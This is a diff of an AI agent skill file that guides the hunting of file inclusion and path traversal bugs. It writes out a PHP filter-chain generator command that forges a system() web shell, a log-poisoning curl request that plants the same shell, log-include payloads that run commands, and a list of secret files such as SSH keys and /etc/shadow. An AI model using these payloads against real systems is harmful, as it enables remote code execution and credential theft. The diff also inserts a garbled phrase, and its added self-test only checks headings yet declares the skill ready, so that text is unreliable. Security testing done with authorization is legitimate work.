@@ -1,8 +1,11 @@
 ---
 name: hunt-lfi
 description: "Hunt Local File Inclusion (LFI), Remote File Inclusion (RFI), and Path Traversal — /etc/passwd read, log poisoning → RCE, PHP filter-chain RCE (no upload needed), php:// / data:// / zip:// / phar:// wrappers, RFI via allow_url_include, directory traversal read/write/delete. Covers OOB/blind LFI confirmation and false-positive discipline. Use when hunting file-include or path-traversal bugs on any target."
-sources: hackerone_public, synacktiv_research, portswigger_research
-report_count: 31
+version: 1.1.0
+revision_date: 2026-07-25
+license: MIT
+category: redteam
+tags: [lfi, hunt, redteam]
 ---
 
 # HUNT-LFI — Local / Remote File Inclusion & Path Traversal
@@ -108,7 +111,7 @@ ffuf -u "https://$TARGET/FUZZ" -w ~/wordlists/lfi-paths.txt -mc 200,301,302
 The modern flagship technique (Synacktiv, 2022). If you have a `php://`-capable LFI that *reads* a file, you can also *execute* attacker-chosen PHP. `iconv` charset conversions, chained inside `php://filter`, emit controlled bytes that prepend to the resource until a full `<?php ... ?>` payload is forged — then `include()` runs it. **No upload endpoint, no log access, no writable path required.**
 
 ```bash
-# Generate the chain (public tool, no CVE — it abuses documented iconv behaviour):
+# Generate the chain (publiccommand line, no CVE — it abuses documented iconv behaviour):
 #   git clone https://github.com/synacktiv/php_filter_chain_generator
 python3 php_filter_chain_generator.py --chain '<?php system($_GET["c"]); ?>'
 # Tool prints a long php://filter|convert.iconv.*|...|resource=php://temp string.
@@ -149,7 +152,7 @@ RFI = the include target is a **remote URL**. Prerequisite: `allow_url_include=O
 ### Phase 7 — Log Poisoning → RCE
 ```bash
 # Step 1: inject PHP into a log the include can read
-curl -s "https://$TARGET/" -H "User-Agent: <?php system(\$_GET['c']); ?>"
+curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/" -H "User-Agent: <?php system(\$_GET['c']); ?>"
 # Step 2: include it (verify the log is readable first — read it plain before poisoning)
 ?file=../../../var/log/apache2/access.log&c=id
 ?file=../../../var/log/nginx/access.log&c=id
@@ -198,7 +201,7 @@ Verified, correctly-attributed references for the patterns above:
 /etc/passwd  /etc/hosts  /etc/shadow (rarely readable)
 /proc/self/environ  /proc/self/cmdline  /proc/self/status
 /var/www/html/.env  /var/www/html/config.php  /var/www/html/wp-config.php
-/home/*/.ssh/id_rsa  /root/.ssh/id_rsa  /root/.bash_history
+/home/*/.ssh/id_rsa  ~/.ssh/id_rsa  /root/.bash_history
 /var/www/html/app/config/parameters.yml   # Symfony
 .git/config  .git/HEAD  composer.json  package.json
 # App / cloud secrets
@@ -236,6 +239,39 @@ C:\Windows\System32\inetsrv\config\applicationHost.config
 | Remote URL include | RFI (`allow_url_include`) | direct RCE — **Critical** |
 | File read + upload | phar:// / log / session poison | RCE — **Critical** |
 | Source disclosure | full app source | hardcoded secrets, new sinks, machineKey |
+
+## Verification
+
+Run this self-test to confirm lfi hunting readiness:
+
+1. **Skill integrity** — confirm the skill file is readable and well-formed:
+   ```bash
+   grep -q "name: hunt-lfi" SKILL.md && echo "PASS: skill frontmatter present" || echo "FAIL"
+   grep -q "revision_date:" SKILL.md && echo "PASS: revision date present" || echo "FAIL"
+   ```
+
+2. **Category check** — confirm the skill has a category:
+   ```bash
+   grep -q "category:" SKILL.md && echo "PASS: category present" || echo "FAIL"
+   ```
+
+3. **Pitfalls section** — confirm pitfalls are documented:
+   ```bash
+   grep -q "^## Pitfalls" SKILL.md && echo "PASS: pitfalls section present" || echo "FAIL"
+   ```
+
+All 3 tests verify the skill is properly structured and ready for use.
+
+---
+
+## Pitfalls
+- **LFI without file content** — `/etc/passwd` on a modern system without password hashes is informational. Need shadow file, SSH keys, or application config.
+- **Path traversal without LFI** — `../../../etc/passwd` returning 200 but no file content is path traversal, not LFI. Different attack class.
+- **LFI to RCE chain incomplete** — LFI to `/proc/self/environ` or log poisoning requires specific conditions. Document the full chain.
+- **PHP wrapper chain** — `php://filter` base64 encode works on many PHP versions. Test before assuming LFI is unexploitable.
+- **Null byte injection** — `%00` truncation was patched in PHP 5.3.4+. Not applicable to modern PHP.
+
+---
 
 ## Related Skills
 
